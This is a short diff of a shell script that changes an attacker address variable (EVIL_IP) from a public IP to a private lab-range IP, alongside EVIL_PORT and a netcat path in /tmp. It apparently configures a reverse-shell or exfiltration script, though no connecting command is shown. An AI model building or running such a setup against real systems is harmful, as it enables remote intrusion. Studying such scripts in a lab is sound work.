@@ -1,6 +1,6 @@
 #!/bin/sh
 
-EVIL_IP=159.89.26.42
+EVIL_IP=192.168.122.160
 EVIL_PORT=3131
 NC=/tmp/nc
 
